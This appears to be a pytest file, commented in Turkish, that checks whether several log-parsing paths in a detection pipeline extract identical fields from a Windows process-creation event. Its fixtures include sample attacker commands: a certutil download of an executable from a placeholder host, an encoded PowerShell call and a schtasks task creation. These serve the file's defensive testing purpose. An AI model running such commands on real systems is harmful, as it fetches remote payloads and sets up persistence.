"""Ham logdan alan cikaran TUM yollar ayni cevabi veriyor mu?

NEDEN VAR -- AYNI HATA UC KEZ OLDU:
  1. Gorev 1  : brace_kv duzeltildi, space_kv ayni bug'i sakladi
  2. Ö1       : uretim build_layered_query'ye gecti, koruma testi hala
                build_enriched_query'ye bakiyordu -- OLU yolu koruyacakti
  3. Bu dosya : parse_fields duzeltildi, normalize_input'un secim mantigi
                hala ESKI cikarimi yetkili sayiyordu

Her seferinde ayni desen: duzeltme BIR yola indi, ayni isi yapan digerleri
eski halinde kaldi, ve TESTLER YESIL KALDI cunku test yalnizca duzeltilen
yola bakiyordu. Yesil test, duzeltmenin her yola indigini GOSTERMEZ --
yalnizca test edilen yola indigini gosterir.

Bu dosya tek tek yol duzeltmiyor; yollarin AYNI FIKIRDE olmasini sozlesme
haline getiriyor. Yarin sekizinci bir yol eklenirse burada gorunur.

KAPSAM: yalnizca TUKETICI yollari. Ham regex'ler (COMMAND_LINE_RE,
KEY_VALUE_RE) bilerek disarida -- artik son care olarak duruyorlar ve
kendi dar alanlarinda (Message govdesi, satir basina tek alan) dogrular.
Sozlesme, bir TUKETICININ gordugu deger uzerinedir.
"""
from __future__ import annotations

import pytest

from app.mapping.text_input import text_to_row
from app.normalization.formats import parse_fields, to_legacy_facts
from app.normalization.input_parser import normalize_input

# Dort bug'i da tetikleyen space_kv girdisi: cok kelimeli komut satiri,
# ardindan BASKA bir sema alani. Kirpma ve tasma burada ayrisir.
ORNEK = (
    r"EventID=4688 NewProcessName=C:\Windows\System32\certutil.exe "
    r"CommandLine=certutil.exe -urlcache -split -f http://k.example/p.exe "
    r"SubjectUserName=jdoe"
)

BEKLENEN = {
    "event_id": "4688",
    "process": r"C:\Windows\System32\certutil.exe",
    "cmdline": "certutil.exe -urlcache -split -f http://k.example/p.exe",
    "user": "jdoe",
}


def _yol_parse_fields():
    f, _ = parse_fields(ORNEK)
    g = lambda k: f[k].text if k in f else None  # noqa: E731
    return {"event_id": g("event.id"), "process": g("process.name"),
            "cmdline": g("process.command_line"), "user": g("account.name")}


def _yol_legacy():
    f, _ = parse_fields(ORNEK)
    lf = to_legacy_facts(f)
    return {"event_id": lf.get("EventID"), "process": lf.get("NewProcessName"),
            "cmdline": lf.get("CommandLine"), "user": lf.get("SubjectUserName")}


def _yol_normalize_duz():
    n = normalize_input(ORNEK)
    return {"event_id": n.get("event_id"), "process": n.get("process_name"),
            "cmdline": n.get("command_line"), "user": n.get("user_account")}


def _yol_extracted_facts():
    ef = normalize_input(ORNEK).get("extracted_facts") or {}
    return {"event_id": ef.get("EventID"), "process": ef.get("NewProcessName"),
            "cmdline": ef.get("CommandLine"), "user": ef.get("SubjectUserName")}


def _yol_text_to_row():
    r = text_to_row(ORNEK)
    return {"event_id": r.get("EventID"), "process": r.get("NewProcessName"),
            "cmdline": r.get("CommandLine"), "user": r.get("SubjectUserName")}


YOLLAR = {
    "parse_fields__YETKILI": _yol_parse_fields,
    "to_legacy_facts": _yol_legacy,
    "normalize_input_duz_alanlar": _yol_normalize_duz,
    "extracted_facts": _yol_extracted_facts,
    "text_to_row__KURAL_MOTORU": _yol_text_to_row,
}


@pytest.mark.parametrize("yol_adi", sorted(YOLLAR))
@pytest.mark.parametrize("alan", sorted(BEKLENEN))
def test_every_path_extracts_the_same_value(yol_adi, alan):
    """Yol x alan matrisi. Tek hucre bile kacamaz."""
    gelen = YOLLAR[yol_adi]()[alan]
    assert gelen == BEKLENEN[alan], (
        f"{yol_adi}: {alan} yanlis\n  beklenen: {BEKLENEN[alan]!r}\n  gelen   : {gelen!r}"
    )


def test_no_path_lets_a_value_run_into_the_next_field():
    """TASMA: OLCULMUS vaka. COMMAND_LINE_RE tirnaksiz dalda `[^\\n]+`
    diyor ve satir sonuna kadar yutuyordu; kural motoruna giden
    CommandLine komsu alanlarin icerigini tasiyordu -- yani fiilen
    Message gibi davraniyordu."""
    for ad, yol in YOLLAR.items():
        cmd = yol()["cmdline"] or ""
        assert "SubjectUserName" not in cmd, f"{ad}: komut satiri sonraki alani yuttu"


def test_no_path_cuts_a_value_at_the_first_space():
    """KIRPMA: OLCULMUS vaka. Eski cikarim 'certutil.exe' donduruyordu --
    o logdaki TEK ayirt edici kanit kayboluyordu."""
    for ad, yol in YOLLAR.items():
        cmd = yol()["cmdline"] or ""
        assert "-urlcache" in cmd, f"{ad}: komut satiri ilk bosluktan kesildi"


def test_the_row_carries_canonical_keys_for_the_rule_conditions():
    """2B kosullari KANONIK alanlara bakacak; satir onlari tasimali.

    Tasimadan once satir yalnizca legacy anahtar tasiyordu; kosullari
    process.command_line'a tasimak SESSIZCE basarisiz olurdu -- row.get()
    None doner, desen bos dizede aranir, eslesme olmaz. 57 kosulun 39'u
    zaten atesleneMEDIGI icin kimse fark etmezdi."""
    r = text_to_row(ORNEK)
    assert r.get("process.command_line") == BEKLENEN["cmdline"]
    assert r.get("process.name") == BEKLENEN["process"]
    assert r.get("event.id") == BEKLENEN["event_id"]
    assert r.get("account.name") == BEKLENEN["user"]


def test_canonical_and_legacy_keys_never_disagree():
    """IKI GERCEKLIK KORUYUCUSU.

    Satir bilerek HEM kanonik HEM legacy anahtar tasiyor: legacy'nin kural
    katalogu disinda alti tuketicisi var ve onlari ayni commit'te tasimak
    gerilemeyi yorumlanamaz kilardi. Bedeli, iki anahtarin ayrisma riski --
    bu test onu sozlesme haline getiriyor.

    Legacy BAGIMSIZ CIKARIM DEGIL, kanonigin izdusumu olmali."""
    r = text_to_row(ORNEK)
    for kanonik, legacy in (
        ("process.command_line", "CommandLine"),
        ("process.name", "NewProcessName"),
        ("event.id", "EventID"),
        ("account.name", "SubjectUserName"),
    ):
        assert r.get(kanonik) == r.get(legacy), (
            f"kanonik '{kanonik}' ile legacy '{legacy}' AYRISTI:\n"
            f"  {kanonik} = {r.get(kanonik)!r}\n  {legacy} = {r.get(legacy)!r}"
        )


def test_a_multi_event_input_collapses_into_a_single_row():
    """BILINEN GERILEME -- sessizce kabul edilmiyor, burada sabitleniyor.

    ID          : multi-event-row-collapse
    TESPIT      : 2026-08-18, 2B tasimasi sirasinda
    BELIRTI     : multi-010'da T1053.005 artik atesleMIYOR (tasima oncesi
                  atesliyordu). 60 senaryoda kaybolan TEK dogru atesleme.

    KOK NEDEN   : `text_to_row` COK OLAYLI bir girdiyi TEK satira indiriyor
                  ve her alanin ILK gecisini aliyor. multi-010 iki 4688
                  olayi tasiyor: birincisi powershell.exe, ikincisi
                  schtasks.exe. Satirin process.name'i 'powershell.exe'
                  oluyor, schtasks.exe kayboluyor.

    TASIMANIN HATASI DEGIL, GORUNUR KILDIGI SEY: tasima oncesi kosul
    Message'da araniyordu ve Message tum metni tasidigi icin schtasks
    IKINCI olaydan eslesiyordu -- satirin kimligi BIRINCI olaya aitken.
    Yani kural DOGRU CEVABI YANLIS SEBEPLE veriyordu: bir olayin kimligiyle
    baska bir olayin kanitini birlestiriyordu.

    Motor zaten cok satirli calisacak sekilde yazilmis
    (`evaluate_rules(rows: list[dict])`); eksik olan, cok olayli girdiyi
    satirlara BOLEN katman.

    KAPANIS KRITERI: `text_to_row` yerini, cok olayli girdiyi N satira
    ayiran bir uretici alacak; multi-010 iki satir uretecek ve T1053.005
    ikinci satirdan atesleyecek. Bu test o zaman KIRILIR ve kayit silinir.
    """
    cok_olayli = (
        "EventID=4688 NewProcessName=powershell.exe CommandLine=powershell -enc AAA "
        "EventID=4688 NewProcessName=schtasks.exe CommandLine=schtasks /create /tn X"
    )
    r = text_to_row(cok_olayli)
    assert r.get("process.name") == "powershell.exe", (
        "ikinci olayin surec adi artik goruluyorsa cok olayli bolme yapilmis "
        "demektir -- bilgi kaydi (multi-event-row-collapse) kapatilmali"
    )
    assert "schtasks" not in (r.get("process.name") or "")


def test_the_rule_engine_sees_what_the_authoritative_parser_produced():
    """Kural motoru YETKILI ayristiriciyla ayni seyi gormeli.

    2B kosullari yapisal alanlara tasiyacak; motorun gordugu deger yetkili
    ayristiricininkinden farkliysa tasima SESSIZCE yanlis calisir."""
    assert _yol_text_to_row() == _yol_parse_fields()
